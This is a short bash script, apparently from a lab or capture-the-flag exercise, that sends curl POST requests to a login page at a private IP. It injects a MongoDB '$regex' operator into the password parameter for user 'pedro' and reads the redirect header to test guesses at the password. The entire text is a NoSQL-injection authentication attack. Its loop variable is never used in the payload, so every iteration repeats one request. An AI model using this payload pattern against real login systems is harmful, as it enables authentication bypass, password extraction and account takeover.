for c in {0..9} {a..z} {A..Z}; do
    location=$(curl -s -D - -o /dev/null \
      'http://10.82.168.224/login.php' \
      -X POST \
      --data "user=pedro&pass[\$regex]=^coolpass123\$&remember=on" |
      grep -i '^Location:')

    echo "$c: $location"
done
